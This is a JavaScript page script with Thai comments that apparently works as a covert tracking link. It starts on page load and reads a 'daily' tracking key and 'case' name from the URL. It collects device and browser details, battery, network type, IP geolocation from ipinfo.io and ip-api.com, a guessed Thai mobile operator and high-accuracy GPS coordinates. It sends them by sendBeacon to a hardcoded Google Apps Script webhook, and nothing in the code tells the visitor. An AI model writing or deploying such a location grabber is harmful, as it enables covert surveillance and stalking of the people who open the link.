// ฟังก์ชันดึง tracking key และ case name จาก URL parameters
function getUrlParameters() {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
    const caseName = urlParams.get('case') || "ไม่มีค่า"; // ดึง case name ด้วย (ถ้ามี)

    console.log("ดึงค่าจาก URL parameters:");
    console.log("- trackingKey:", trackingKey);
    console.log("- caseName:", caseName);

    return {
      trackingKey: trackingKey,
      caseName: caseName
    };
  } catch (error) {
    console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
    return {
      trackingKey: "ไม่มีค่า",
      caseName: "ไม่มีค่า"
    };
  }
}

// สร้าง ID เฉพาะสำหรับการร้องขอ
function generateUniqueId() {
  const timestamp = Date.now().toString(36);
  const randomPart = Math.random().toString(36).substring(2, 10);
  return `req-${timestamp}-${randomPart}`;
}

// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
function getDetailedDeviceInfo() {
  const userAgent = navigator.userAgent;
  const vendor = navigator.vendor || "ไม่มีข้อมูล";

  let deviceType = "คอมพิวเตอร์";
  let deviceModel = "ไม่สามารถระบุได้";
  let osInfo = "ไม่สามารถระบุได้";
  let deviceBrand = "ไม่สามารถระบุได้";
  let osName = "ไม่สามารถระบุได้";
  let osVersion = "ไม่ระบุ";

  const isIPad = detectIPad();

  if (isIPad) {
    deviceType = "แท็บเล็ต";
    deviceBrand = "Apple";
    const deviceDetails = getIPadModel(userAgent);
    deviceModel = deviceDetails.model;
    osName = "iPadOS";
    osVersion = deviceDetails.version;
    osInfo = `${osName} ${osVersion}`;
  } else if (/iPhone|iPod/.test(userAgent)) {
    deviceType = "มือถือ";
    deviceBrand = "Apple";
    const deviceDetails = getIPhoneModel(userAgent);
    deviceModel = deviceDetails.model;
    osName = "iOS";
    osVersion = deviceDetails.version;
    osInfo = `${osName} ${osVersion}`;
  } else if (/android/i.test(userAgent)) {
    const androidInfo = getAndroidInfo(userAgent);
    deviceType = "มือถือ";
    deviceBrand = androidInfo.brand;
    deviceModel = androidInfo.model;
    osName = "Android";
    osVersion = androidInfo.osVersion.replace('Android ', '');
    osInfo = androidInfo.osVersion;
  } else if (/Macintosh|Mac OS X/i.test(userAgent)) {
    deviceType = "คอมพิวเตอร์";
    deviceBrand = "Apple";
    osName = "macOS";
    osVersion = getMacOSVersion(userAgent);
    osInfo = `${osName} ${osVersion}`;
  } else if (/Windows|Win64|Win32/i.test(userAgent)) {
    deviceType = "คอมพิวเตอร์";
    deviceBrand = "Windows PC";
    osName = "Windows";
    osVersion = getWindowsVersion(userAgent);
    osInfo = `${osName} ${osVersion}`;
  } else if (/Linux/i.test(userAgent)) {
    deviceType = "คอมพิวเตอร์";
    deviceBrand = "Linux PC";
    osName = "Linux";
    osVersion = "ไม่ระบุ";
    osInfo = "Linux";
  }

  let platformName = osName;

  return {
    userAgent: userAgent,
    vendor: vendor,
    deviceType: deviceType,
    deviceModel: deviceModel,
    osInfo: osInfo,
    osName: osName,
    osVersion: osVersion,
    platform: platformName,
    deviceBrand: deviceBrand
  };
}

// ฟังก์ชันตรวจสอบ iPad โดยเฉพาะ
function detectIPad() {
  const ua = navigator.userAgent;
  if (/iPad/.test(ua)) return true;
  if (/Macintosh/.test(ua) && navigator.maxTouchPoints > 1) return true; // iPadOS 13+
  if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
  return false;
}

// ฟังก์ชันดึงข้อมูลรุ่น iPad
function getIPadModel(ua) {
  let model = "iPad";
  let version = "ไม่ระบุ";
  version = getIOSVersion(ua);
  const modelMatch = ua.match(/iPad([0-9]+,[0-9]+)/);
  if (modelMatch) model = `iPad (${modelMatch[1]})`;
  return { model: model, version: version };
}

// ฟังก์ชันดึงข้อมูลรุ่น iPhone
function getIPhoneModel(ua) {
  let model = "iPhone";
  let version = "ไม่ระบุ";
  version = getIOSVersion(ua);
  const modelMatch = ua.match(/iPhone([0-9]+,[0-9]+)/);
  if (modelMatch) model = `iPhone (${modelMatch[1]})`;
  return { model: model, version: version };
}

// ฟังก์ชันดึงข้อมูลรุ่นเครื่องและระบบ Android
function getAndroidInfo(ua) {
  let brand = "Android";
  let model = "ไม่ทราบรุ่น";
  let osVersion = "ไม่ทราบ";

  const androidVersionMatch = ua.match(/Android\s([0-9\.]+)/);
  if (androidVersionMatch) osVersion = androidVersionMatch[1];

  try {
    let modelInfo = ua.substring(ua.indexOf('(') + 1);
    modelInfo = modelInfo.substring(0, modelInfo.indexOf(')'));
    const modelParts = modelInfo.split(';').map(part => part.trim()).filter(part => part && part !== 'Android');

    if (modelParts.length > 1) {
      const commonBrands = ['Samsung', 'Xiaomi', 'Redmi', 'POCO', 'Huawei', 'Oppo', 'Vivo', 'OnePlus', 'Realme', 'Nokia', 'Sony', 'LG', 'Motorola', 'HTC'];
      for (let i = 0; i < modelParts.length; i++) {
        const part = modelParts[i];
        const foundBrand = commonBrands.find(b => part.includes(b));
        if (foundBrand) {
          brand = foundBrand;
          model = (i + 1 < modelParts.length) ? modelParts[i + 1] : (part.replace(foundBrand, '').trim() || "ไม่ทราบรุ่น");
          break;
        }
        if (i === modelParts.length - 1) model = part;
      }
    } else if (modelParts.length === 1) {
      model = modelParts[0];
    }
  } catch (error) {
    console.error("Error parsing Android info:", error);
    model = "ไม่สามารถระบุรุ่นได้";
  }

  return { brand: brand, model: model, osVersion: `Android ${osVersion}` };
}

// ฟังก์ชันดึงเวอร์ชัน iOS
function getIOSVersion(ua) {
  const match = ua.match(/OS\s(\d+_\d+(_\d+)?)/i);
  if (match) return match[1].replace(/_/g, '.');
  const webkitMatch = ua.match(/Version\/([\d\.]+)/i);
  if (webkitMatch) return webkitMatch[1];
  return "ไม่ทราบเวอร์ชัน";
}

// ฟังก์ชันดึงเวอร์ชัน macOS
function getMacOSVersion(ua) {
  const match = ua.match(/Mac OS X\s*([0-9_\.]+)/i);
  if (match) {
    const version = match[1].replace(/_/g, '.');
    if (version.startsWith('14')) return "Sonoma";
    if (version.startsWith('13')) return "Ventura";
    if (version.startsWith('12')) return "Monterey";
    if (version.startsWith('11')) return "Big Sur";
    if (version.startsWith('10.15')) return "Catalina";
    if (version.startsWith('10.14')) return "Mojave";
    return `macOS ${version}`;
  }
  return "macOS";
}

// ฟังก์ชันดึงเวอร์ชัน Windows
function getWindowsVersion(ua) {
  if (/Windows NT 10.0/.test(ua)) return "11/10";
  if (/Windows NT 6.3/.test(ua)) return "8.1";
  if (/Windows NT 6.2/.test(ua)) return "8";
  if (/Windows NT 6.1/.test(ua)) return "7";
  return "เวอร์ชันเก่า";
}

// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด
function getConnectionInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  let info = { type: "ไม่ทราบ", effectiveType: "ไม่ทราบ", downlink: null, rtt: null, saveData: false, isWifi: false, isMobile: false, networkType: "ไม่ทราบ" };

  if (connection) {
    info.type = connection.type || "ไม่ทราบ";
    info.effectiveType = connection.effectiveType || "ไม่ทราบ";
    info.downlink = connection.downlink || null;
    info.rtt = connection.rtt || null;
    info.saveData = connection.saveData || false;

    if (info.type === 'wifi') { info.isWifi = true; info.networkType = "WiFi"; }
    else if (info.type === 'cellular') {
      info.isMobile = true;
      if (info.effectiveType.includes('4g') || info.effectiveType.includes('5g')) info.networkType = "4G/5G";
      else if (info.effectiveType.includes('3g')) info.networkType = "3G";
      else if (info.effectiveType.includes('2g')) info.networkType = "2G";
      else info.networkType = "Mobile Data";
    }
    else if (info.type === 'ethernet') { info.networkType = "Ethernet"; }
    else if (info.type !== 'unknown' && info.type !== 'none' && info.type !== 'other') { info.networkType = info.type; }
    else {
      if (info.effectiveType.includes('4g')) info.networkType = "Fast (4G-like)";
      else if (info.effectiveType.includes('3g')) info.networkType = "Medium (3G-like)";
      else if (info.effectiveType.includes('2g')) info.networkType = "Slow (2G-like)";
    }
  }
  return info;
}

// ฟังก์ชันตรวจสอบระดับแบตเตอรี่
async function getBatteryInfo() {
  try {
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      return { level: Math.floor(battery.level * 100) + "%", charging: battery.charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ" };
    }
    return { level: "ไม่รองรับ", charging: "ไม่รองรับ" };
  } catch (error) {
    console.error("Error getting battery info:", error);
    return { level: "ข้อผิดพลาด", charging: "ข้อผิดพลาด" };
  }
}

// ฟังก์ชันตรวจสอบประเภทเบราว์เซอร์
function detectBrowser() {
    const ua = navigator.userAgent;
    let browserName = "ไม่ทราบ";
    let fullVersion = "ไม่ทราบ";
    let majorVersion = "ไม่ทราบ";
    let nameOffset, verOffset, ix;

    if (ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1) browserName = "Facebook App";
    else if (ua.indexOf("Instagram") > -1) browserName = "Instagram App";
    else if (ua.indexOf("Line") > -1) { browserName = "LINE App"; verOffset = ua.indexOf("Line/"); if (verOffset !== -1) fullVersion = ua.substring(verOffset + 5); }
    else if (ua.indexOf("Twitter") > -1) browserName = "Twitter App";
    else if (ua.indexOf("CriOS") > -1) { browserName = "Chrome iOS"; verOffset = ua.indexOf("CriOS/"); if (verOffset !== -1) fullVersion = ua.substring(verOffset + 6); }
    else if (ua.indexOf("FxiOS") > -1) { browserName = "Firefox iOS"; verOffset = ua.indexOf("FxiOS/"); if (verOffset !== -1) fullVersion = ua.substring(verOffset + 6); }
    else if (ua.indexOf("EdgiOS") > -1) { browserName = "Edge iOS"; verOffset = ua.indexOf("EdgiOS/"); if (verOffset !== -1) fullVersion = ua.substring(verOffset + 7); }
    else if ((verOffset = ua.indexOf("Edg")) != -1) { browserName = "Edge"; fullVersion = ua.substring(verOffset + 4); }
    else if ((verOffset = ua.indexOf("SamsungBrowser")) != -1) { browserName = "Samsung Internet"; fullVersion = ua.substring(verOffset + 15); }
    else if ((verOffset = ua.indexOf("OPR")) != -1 || (verOffset = ua.indexOf("Opera")) != -1) { browserName = "Opera"; if (ua.indexOf("OPR") != -1) fullVersion = ua.substring(verOffset + 4); else fullVersion = ua.substring(verOffset + 6); }
    else if ((verOffset = ua.indexOf("Chrome")) != -1) { browserName = "Chrome"; fullVersion = ua.substring(verOffset + 7); }
    else if ((verOffset = ua.indexOf("Safari")) != -1) { browserName = "Safari"; fullVersion = ua.substring(verOffset + 7); if ((verOffset = ua.indexOf("Version")) != -1) fullVersion = ua.substring(verOffset + 8); }
    else if ((verOffset = ua.indexOf("Firefox")) != -1) { browserName = "Firefox"; fullVersion = ua.substring(verOffset + 8); }
    else if ((nameOffset = ua.lastIndexOf(' ') + 1) < (verOffset = ua.lastIndexOf('/'))) { browserName = ua.substring(nameOffset, verOffset); fullVersion = ua.substring(verOffset + 1); if (browserName.toLowerCase() == browserName.toUpperCase()) browserName = navigator.appName; }

    if ((ix = fullVersion.indexOf(";")) != -1) fullVersion = fullVersion.substring(0, ix);
    if ((ix = fullVersion.indexOf(" ")) != -1) fullVersion = fullVersion.substring(0, ix);
    if ((ix = fullVersion.indexOf(")")) != -1) fullVersion = fullVersion.substring(0, ix);

    majorVersion = parseInt('' + fullVersion, 10);
    if (isNaN(majorVersion)) { fullVersion = 'ไม่ทราบ'; majorVersion = 'ไม่ทราบ'; }

    let isWebView = (ua.indexOf("; wv") > -1) || (ua.indexOf("iPhone") > -1 && ua.indexOf("Safari") === -1 && ua.indexOf("CriOS") === -1 && ua.indexOf("FxiOS") === -1) || (browserName.includes("App"));

    return `${browserName} ${fullVersion}${isWebView ? ' (WebView)' : ''}`;
}

// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io และ fallback)
async function getIPDetails() {
  try {
    const response = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN'); // ใส่ Token ถ้ามี
    if (!response.ok) {
        console.warn(`ipinfo.io request with token failed (${response.status}), retrying without token.`);
        const responseNoToken = await fetch('https://ipinfo.io/json');
        if (!responseNoToken.ok) throw new Error(`ipinfo.io request failed with status ${responseNoToken.status}`);
        return await responseNoToken.json();
    }
    return await response.json();
  } catch (error) {
    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
    try { // Fallback 1: ip-api.com
        console.log("Trying fallback: ip-api.com");
        const fallbackResponse = await fetch('http://ip-api.com/json');
        if (!fallbackResponse.ok) throw new Error(`ip-api.com request failed with status ${fallbackResponse.status}`);
        const fbData = await fallbackResponse.json();
        return { ip: fbData.query || "ไม่สามารถระบุได้", hostname: "ไม่มีข้อมูล (ip-api)", city: fbData.city || "ไม่ทราบ", region: fbData.regionName || "ไม่ทราบ", country: fbData.countryCode || "ไม่ทราบ", loc: fbData.lat && fbData.lon ? `${fbData.lat},${fbData.lon}` : "ไม่มีข้อมูล", org: fbData.org || "ไม่ทราบ", isp: fbData.isp || "ไม่ทราบ", asn: fbData.as ? fbData.as.split(' ')[0] : "ไม่ทราบ", postal: "ไม่มีข้อมูล (ip-api)", timezone: fbData.timezone || "ไม่ทราบ" };
    } catch (fallbackError) {
        console.error("ไม่สามารถดึง IP จาก fallback (ip-api.com) ได้:", fallbackError);
        try { // Fallback 2: ipify.org
            console.log("Trying final fallback: api.ipify.org");
            const finalFallbackResponse = await fetch('https://api.ipify.org?format=json');
            const finalFbData = await finalFallbackResponse.json();
            return { ip: finalFbData.ip || "ไม่สามารถระบุได้" };
        } catch (finalFallbackError) {
             console.error("ไม่สามารถดึง IP จาก final fallback (ipify) ได้:", finalFallbackError);
             return { ip: "ไม่สามารถระบุได้" };
        }
    }
  }
}

// ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์ (มีข้อจำกัด)
async function estimatePhoneNumber() {
  const phoneInfo = { mobileOperator: "ไม่สามารถระบุได้", possibleOperator: "ไม่สามารถระบุได้", countryCode: "ไม่สามารถระบุได้", remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรง" };
  try {
    const ipDetails = await getIPDetails();
    const ispInfo = ipDetails.isp || ipDetails.org || "";
    const thaiOperators = { "AIS": ["AIS", "Advanced Info Service", "AWN"], "DTAC": ["DTAC", "Total Access Communication", "DTN"], "TRUE": ["TRUE", "True Move", "TrueMove", "True Corporation", "Real Future"], "NT": ["CAT", "TOT", "National Telecom"], "3BB": ["Triple T Broadband", "3BB"] };

    for (const [operator, keywords] of Object.entries(thaiOperators)) {
      if (keywords.some(keyword => ispInfo.toLowerCase().includes(keyword.toLowerCase()))) {
        phoneInfo.possibleOperator = operator;
        break;
      }
    }
    if (ipDetails.country) phoneInfo.countryCode = ipDetails.country;

    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
        if (connection.type === 'cellular') phoneInfo.remarks = "เชื่อมต่อผ่านเครือข่ายมือถือ " + (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" ? `(${phoneInfo.possibleOperator})` : "");
        else if (connection.type === 'wifi') phoneInfo.remarks = "เชื่อมต่อผ่าน WiFi";
        else if (connection.type === 'ethernet') phoneInfo.remarks = "เชื่อมต่อผ่าน Ethernet";
    }
    return phoneInfo;
  } catch (error) {
    console.error("ไม่สามารถประมาณการข้อมูลโทรศัพท์ได้:", error);
    return phoneInfo;
  }
}

// ฟังก์ชันขอตำแหน่ง GPS
function getGeolocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      console.warn("Geolocation API is not supported.");
      resolve("ไม่มีข้อมูล");
      return;
    }

    console.log("Requesting geolocation...");
    navigator.geolocation.getCurrentPosition(
      (position) => {
        console.log("Geolocation success:", position.coords);
        resolve({
          lat: position.coords.latitude,
          long: position.coords.longitude,
          accuracy: position.coords.accuracy,
          gmapLink: `https://www.google.com/maps?q=$${position.coords.latitude},${position.coords.longitude}`,
        });
      },
      (error) => {
        console.error(`Geolocation error: ${error.message} (Code: ${error.code})`);
        resolve("ไม่มีข้อมูล"); // ส่ง "ไม่มีข้อมูล" เมื่อเกิดข้อผิดพลาดหรือผู้ใช้ปฏิเสธ
      },
      {
        timeout: 15000, // 15 วินาที
        enableHighAccuracy: true,
        maximumAge: 0, // ไม่ใช้ cache
      }
    );
  });
}


// --- ฟังก์ชันหลักในการรวบรวมและส่งข้อมูล ---
async function collectAndSendData() {
  console.log("collectAndSendData started.");

  // 1. ดึง Tracking Key และ Case Name
  const { trackingKey, caseName } = getUrlParameters();
  if (!trackingKey || trackingKey === "ไม่มีค่า") {
    console.error("Invalid or missing tracking key. Halting.");
    return;
  }
  console.log("Tracking key validated:", trackingKey);

  // 2. สร้าง Request ID
  const requestId = generateUniqueId();
  console.log("Generated Request ID:", requestId);

  // 3. รวบรวมข้อมูลพื้นฐาน (ทำพร้อมกันได้)
  const timestamp = new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
  const deviceInfo = getDetailedDeviceInfo();
  const screenSize = `${window.screen.width}x${window.screen.height}`;
  const screenColorDepth = window.screen.colorDepth;
  const devicePixelRatio = window.devicePixelRatio || 1;
  const referrer = document.referrer || "ไม่มีข้อมูล";
  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
  const platform = deviceInfo.osInfo || navigator.platform || "ไม่มีข้อมูล";
  const connection = getConnectionInfo();
  const browser = detectBrowser();

  // 4. รวบรวมข้อมูลที่ต้องใช้ Promise (ทำพร้อมกัน)
  try {
    const [ipData, phoneInfo, batteryData, locationData] = await Promise.all([
      getIPDetails(),
      estimatePhoneNumber(),
      getBatteryInfo(),
      getGeolocation() // ขอตำแหน่ง GPS
    ]);

    console.log("All async data collected:");
    console.log("IP Info:", ipData);
    console.log("Phone Info:", phoneInfo);
    console.log("Battery Info:", batteryData);
    console.log("Location Info:", locationData);

    // 5. รวบรวมข้อมูลทั้งหมด
    const allDeviceData = {
      ...deviceInfo,
      screenSize,
      screenColorDepth,
      devicePixelRatio,
      language,
      platform,
      browser,
      connection,
      battery: batteryData
    };

    const dataToSend = {
      timestamp: timestamp,
      ip: ipData,
      deviceInfo: allDeviceData,
      phoneInfo: phoneInfo,
      location: locationData, // เพิ่มข้อมูลตำแหน่ง
      referrer: referrer,
      trackingKey: trackingKey,
      caseName: caseName,
      useServerMessage: true,
      requestId: requestId
    };

    // 6. ส่งข้อมูลด้วย sendBeacon
    sendDataWithBeacon(dataToSend);

  } catch (error) {
    console.error("Error during data collection:", error);
    // อาจจะส่งข้อมูลเท่าที่รวบรวมได้ หรือบันทึกข้อผิดพลาด
    // ตัวอย่าง: ส่งข้อมูลพื้นฐานถ้าเกิดข้อผิดพลาดในการดึงข้อมูล async
    const basicData = {
        timestamp: timestamp,
        ip: { ip: "Error collecting" },
        deviceInfo: { /* ข้อมูลพื้นฐาน */ },
        location: "Error collecting",
        referrer: referrer,
        trackingKey: trackingKey,
        caseName: caseName,
        useServerMessage: true,
        requestId: requestId,
        error: `Collection Error: ${error.message}`
    };
    sendDataWithBeacon(basicData);
  }
}

// --- ฟังก์ชันส่งข้อมูลด้วย sendBeacon ---
function sendDataWithBeacon(dataToSend) {
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbyZD12uemqGsRYKRM6M2UyjfgjlkX6BBjwmTrf0F4yeTsBTqlXyVWVrICgO1wD4DkeP/exec';
  const currentRequestId = dataToSend.requestId;

  // ใช้ sessionStorage เพื่อป้องกันการส่งซ้ำใน session ปัจจุบัน
  const sentKey = `sent_${currentRequestId}`;
  if (sessionStorage.getItem(sentKey)) {
    console.log(`DUPLICATE (Session Storage): ข้อมูลสำหรับ requestId ${currentRequestId} เคยส่งแล้ว`);
    return;
  }

  console.log(`Attempting to send data via sendBeacon (requestId: ${currentRequestId})`);
  console.log("Data:", JSON.stringify(dataToSend));

  try {
    // แปลงข้อมูลเป็น Blob เนื่องจาก sendBeacon ทำงานได้ดีกับ Blob หรือ FormData
    const blob = new Blob([JSON.stringify(dataToSend)], { type: 'text/plain;charset=utf-8' });

    // ส่งข้อมูล
    const success = navigator.sendBeacon(webhookUrl, blob);

    if (success) {
      console.log(`sendBeacon queued data successfully for requestId: ${currentRequestId}`);
      // บันทึกว่าส่งแล้วใน session นี้
      try {
        sessionStorage.setItem(sentKey, 'true');
        console.log(`บันทึก requestId ${currentRequestId} ลงใน sessionStorage`);
      } catch (e) {
        console.error("ไม่สามารถบันทึก requestId ลง sessionStorage:", e);
      }
    } else {
      console.error(`sendBeacon failed to queue data for requestId: ${currentRequestId}. Might be data size issue or browser limitation.`);
      // อาจจะลอง fallback ไปใช้ fetch ถ้า sendBeacon ล้มเหลวทันที (ไม่น่าเกิดบ่อย)
    }
  } catch (error) {
    console.error(`Error calling sendBeacon (requestId: ${currentRequestId}):`, error);
  }
}

// --- เริ่มการทำงานหลัก ---
// ใช้ Listener เพื่อให้แน่ใจว่า DOM พร้อม แต่ sendBeacon ไม่จำเป็นต้องรอ DOMContentLoaded
// เรียกใช้ฟังก์ชันหลักทันที
collectAndSendData();

// เพิ่ม Listener สำหรับ event 'pagehide' หรือ 'unload' เพื่อส่งข้อมูลครั้งสุดท้าย (ถ้าจำเป็น)
// ปกติ sendBeacon ควรจะจัดการเรื่องนี้ได้ แต่ใส่ไว้เผื่อกรณี edge case
// window.addEventListener('unload', () => {
//   // อาจจะเรียก collectAndSendData() อีกครั้ง แต่ต้องระวังการส่งซ้ำ
//   // หรือมี logic เฉพาะสำหรับ unload event
//   console.log("Window unloading...");
// }, false);
